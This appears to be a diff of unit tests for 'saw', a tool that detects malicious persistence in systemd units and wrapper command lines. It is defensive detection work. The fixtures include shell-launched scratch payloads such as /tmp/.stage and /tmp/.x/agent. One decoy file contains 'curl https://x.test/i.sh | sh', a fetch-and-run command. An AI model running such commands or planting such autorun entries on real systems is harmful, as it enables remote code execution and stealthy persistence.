@@ -12,6 +12,7 @@ instead — is the payload PATH under scratch — which is what it meant all alo
 """
 from __future__ import annotations
 
+import os
 import tempfile
 import unittest
 from pathlib import Path
@@ -214,6 +215,11 @@ class TestEveryExecDirectiveIsShellContext(unittest.TestCase):
             "[Service]\nExecCondition=/bin/sh -c 'z; /tmp/.stage'\nExecStart=/usr/bin/myd\n",
         "backslash continuation":
             "[Service]\nExecStart=/bin/sh -c 'sleep 1 \\\n  ; /tmp/.stage'\n",
+        # The payload as the WHOLE code argument, with no `;`/`&&` in front of it. Every case above
+        # also matches on the raw directive via the operator arm, so all six stayed green through a
+        # regression that resolved only `argv` — this one needs the code argument to be extracted.
+        "bare code argument":
+            "[Service]\nExecStart=/usr/bin/true\nExecStartPost=/bin/sh -c '/tmp/.stage'\n",
     }
 
     BENIGN = {
@@ -311,7 +317,7 @@ class TestInvocationResolver(unittest.TestCase):
     while a multi-line `sh -c` script went silent."""
 
     def _inv(self, argv):
-        return grade.resolve_invocation(_entry(argv))
+        return grade.resolve_invocation(argv)
 
     def test_wrappers_resolve_to_the_real_interpreter(self):
         inv = self._inv(["/usr/bin/env", "A=1", "bash", "-c", "/tmp/.x/agent"])
@@ -331,13 +337,41 @@ class TestInvocationResolver(unittest.TestCase):
         self.assertEqual(inv.code_args, ("x = 1",))
         self.assertFalse(inv.is_posix_shell)
 
-    def test_every_code_flag_is_taken_not_just_the_first(self):
-        self.assertEqual(self._inv(["/bin/sh", "-c", "a", "-c", "/tmp/.x/agent"]).code_args,
-                         ("a", "/tmp/.x/agent"))
+    def test_what_follows_the_code_is_an_argument_to_it_never_a_path(self):
+        # `sh -c <script> <$0> <$1…>` — the tokens after the script are its arguments. Reading one as
+        # a path both misstates what runs and makes saw OPEN it: a report named on a `python3 -m
+        # json.tool` line was read, and a quoted command inside it graded the entry a foothold.
+        for argv in (["/usr/bin/python3", "-m", "json.tool", "/tmp/report.json"],
+                     ["/usr/bin/python3", "-c", "import json", "/tmp/report.json"],
+                     ["/bin/sh", "-c", "exec \"$0\"", "/tmp/wrapper.sh"]):
+            self.assertEqual(self._inv(argv).payload_path, argv[0], argv)
 
-    def test_a_module_name_is_not_a_path(self):
-        self.assertEqual(self._inv(["/usr/bin/python3", "-m", "pkg", "/tmp/x.py"]).payload_path,
-                         "/tmp/x.py")
+    def test_a_wrapper_option_does_not_become_the_program(self):
+        # `-u` takes a value, so the program is two tokens further on. Landing on the flag left
+        # `is_posix_shell` False and the payload unseen — measured on seven wrapper forms.
+        for argv in (["/usr/bin/sudo", "-u", "nobody", "/bin/sh", "-c", "/tmp/.x/agent"],
+                     ["/usr/bin/env", "-i", "/bin/bash", "-c", "/tmp/.x/agent"],
+                     ["/usr/bin/env", "-u", "PATH", "/bin/sh", "-c", "/tmp/.x/agent"],
+                     ["/usr/bin/nice", "-n", "10", "/bin/sh", "-c", "/tmp/.x/agent"],
+                     ["/usr/bin/setsid", "-f", "/bin/sh", "-c", "/tmp/.x/agent"],
+                     ["/usr/bin/stdbuf", "-oL", "/bin/sh", "-c", "/tmp/.x/agent"]):
+            self.assertTrue(self._inv(argv).is_posix_shell, argv)
+            self.assertTrue(grade.content_signal(_entry(argv)).hit, argv)
+
+    def test_a_payload_named_like_a_wrapper_is_still_the_payload(self):
+        # Matching a wrapper on `basename.split('.')[0]`, anywhere on disk, skipped past a payload
+        # called `env.sh` — and `command` under a scratch path is the suspicious case, not a wrapper.
+        # Each carries a following argument, so a skip lands somewhere and cannot pass by fallback.
+        for argv in (["/tmp/.x/env.sh", "/opt/app.conf"], ["/tmp/.x/time.py", "/opt/app.conf"],
+                     ["/tmp/.x/command", "run"], ["/tmp/a=b/agent", "--serve"]):
+            self.assertEqual(self._inv(argv).payload_path, argv[0], argv)
+
+    def test_only_a_real_assignment_is_skipped_inside_a_wrapper(self):
+        # `"=" in arg.partition("=")[1]` is true of ANY token containing `=`, so a scratch payload
+        # whose directory has one was skipped as if it were `VAR=value` and never checked.
+        self.assertEqual(self._inv(["/usr/bin/env", "/tmp/a=b/agent"]).payload_path, "/tmp/a=b/agent")
+        self.assertEqual(self._inv(["/usr/bin/env", "A=1", "/tmp/.x/agent"]).payload_path,
+                         "/tmp/.x/agent")
 
     def test_a_multi_line_shell_script_is_seen_line_by_line(self):
         argv = ["/bin/sh", "-c", "export PATH=/usr/bin\numask 077\nexec /tmp/.x/agent &"]
@@ -345,3 +379,26 @@ class TestInvocationResolver(unittest.TestCase):
         # and the ';'-separated form it used to differ from by one character
         self.assertTrue(grade.content_signal(
             _entry(["/bin/sh", "-c", "export PATH=/usr/bin; umask 077; exec /tmp/.x/agent &"])).hit)
+
+    def test_an_entry_resolves_every_command_line_not_only_argv(self):
+        # `argv` is the first ExecStart alone. Resolving the entry rather than each of its command
+        # lines is the same derived-proxy shape one layer in: the authority is `shell_lines`.
+        entry = AutorunEntry(location="systemd-user", path="/x/u.service", argv=["/usr/bin/true"],
+                             body="", persistence={},
+                             shell_lines=["/usr/bin/true", "/bin/sh -c '/tmp/.stage'"])
+        self.assertEqual([i.code_args for i in grade._invocations(entry)], [(), ("/tmp/.stage",)])
+
+    def test_a_payload_that_is_not_an_absolute_path_is_never_read(self):
+        # `env A=1 bash -c id` resolves its payload to `bash`, which as a bare name would be opened
+        # against saw's own working directory — attacker-influenceable, and never a real autorun.
+        # The decoy must EXIST and the cwd must be it, or the assertion holds for the wrong reason.
+        entry = _entry(["/usr/bin/env", "A=1", "bash", "-c", "id"])
+        self.assertEqual(grade._payload_path(entry), "bash")
+        cwd = os.getcwd()
+        with tempfile.TemporaryDirectory(dir=Path.home()) as d:
+            (Path(d) / "bash").write_text("#!/bin/sh\ncurl https://x.test/i.sh | sh\n")
+            try:
+                os.chdir(d)
+                self.assertEqual(grade._referenced_text(entry), "")
+            finally:
+                os.chdir(cwd)
